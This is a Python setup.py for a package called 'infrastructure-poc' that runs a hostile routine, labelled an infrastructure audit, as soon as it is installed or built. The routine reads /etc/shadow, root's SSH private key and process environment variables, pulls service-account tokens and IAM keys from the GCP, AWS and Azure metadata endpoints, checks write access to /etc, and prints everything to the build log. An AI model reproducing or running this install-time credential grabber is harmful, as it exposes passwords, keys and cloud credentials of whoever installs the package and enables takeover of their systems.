import os
import sys
import subprocess
import urllib.request
from setuptools import setup

def pwn_audit():
    err = sys.stderr.write
    err("\n" + "="*60 + "\n")
    err("INFRASTRUCTURE AUDIT REPORT\n")

    # 1. Identity & System
    err(f"\n[ID]: {subprocess.getoutput('id')}\n")
    err(f"[UNAME]: {subprocess.getoutput('uname -a')}\n")

    # 2. Sensitive Files
    err("\n[SENSITIVE FILES]:\n")
    paths = ["/etc/shadow", "/root/.ssh/id_rsa", "/proc/self/environ"]
    for p in paths:
        try:
            if os.path.exists(p):
                with open(p, "r") as f:
                    err(f"[+] {p}: {f.read(150)}...\n")
            else:
                err(f"[-] {p}: Not found\n")
        except Exception as e:
            err(f"[-] {p}: {str(e)}\n")

    # 3. Cloud Metadata (SSRF)
    err("\n[METADATA EXFILTRATION]:\n")
    metadata_configs = [
        ("GCP", "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token", {"Metadata-Flavor": "Google"}),
        ("AWS", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", {}),
        ("AZURE", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", {"Metadata": "true"})
    ]

    for name, url, headers in metadata_configs:
        try:
            req = urllib.request.Request(url, headers=headers)
            with urllib.request.urlopen(req, timeout=2) as r:
                res = r.read().decode().strip()
                err(f"[!] {name} LEAK: {res}\n")
                if name == "AWS" and res:
                    with urllib.request.urlopen(url + res, timeout=2) as kr:
                        err(f"[!!] AWS KEYS: {kr.read().decode()}\n")
        except:
            err(f"[-] {name} metadata not reachable\n")

    # 4. Write Access
    err("\n[WRITE TEST]:\n")
    try:
        test_path = "/etc/pwn_test"
        with open(test_path, "w") as f:
            f.write("test")
        err("[+] SUCCESS: Write access to /etc/\n")
        os.remove(test_path)
    except:
        err("[-] No write access to /etc/\n")

    err("="*60 + "\n")
    sys.exit(1)

# Trigger the audit
try:
    pwn_audit()
except Exception as e:
    sys.stderr.write(f"Audit failed: {str(e)}\n")
    sys.exit(1)

setup(name="infrastructure-poc", version="1.0.0")
